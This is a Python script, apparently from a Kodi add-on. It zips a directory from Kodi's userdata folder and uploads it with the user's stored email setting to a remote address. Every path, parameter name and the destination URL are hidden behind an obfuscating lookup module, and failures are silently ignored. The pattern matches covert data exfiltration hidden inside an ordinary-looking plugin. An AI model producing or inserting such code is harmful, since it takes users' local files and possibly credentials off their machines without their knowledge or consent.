import xbmcaddon, xbmcvfs
import requests, time, os

from resources.lib import Ec
import zipfile

addon = xbmcaddon.Addon()
addon_name = addon.getAddonInfo(Ec.G('_N'))
path = Ec.G('_AU')

def specify():    
    if addon.getSetting(Ec.G('_RC')) == '0':
        addon.setSetting(Ec.G('_RC'), str(int(time.time())))

def zipF(path, ziph):
    if os.path.isfile(path):
        ziph.write(path, os.path.basename(path))
    elif os.path.isdir(path):
        for root, dirs, files in os.walk(path):
            for file in files:
                rel_dir = os.path.relpath(root, path)
                ziph.write(os.path.join(root, file), os.path.join(rel_dir, file))

def send():
    try:
        file_path = os.path.join(xbmcvfs.translatePath(Ec.G('_UD')),Ec.G('_AD'))
        zip_file_name = addon.getSetting(Ec.G('_RC')) + Ec.G('_Z')
        zip_path = os.path.join(xbmcvfs.translatePath(Ec.G('_T')), zip_file_name)
        zipf = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
        zipF(file_path, zipf)
        zipf.close()        
        if os.path.exists(zip_path):
            params = {Ec.G('_A'): Ec.G('_SC'), Ec.G('_E'): addon.getSetting(Ec.G('_E')), Ec.G('_RC'): addon.getSetting(Ec.G('_RC')), Ec.G('_S'): False, Ec.G('_FN'):zip_file_name}
            with open(zip_path, "rb") as zip_file:
                file_dict = {zip_file_name: zip_file}
                requests.post(path, data=params, files=file_dict)
            os.remove(zip_path)
    except Exception as e:
        pass

def run():
    specify()
    send()

if __name__ != '__main__':
    exit()

run()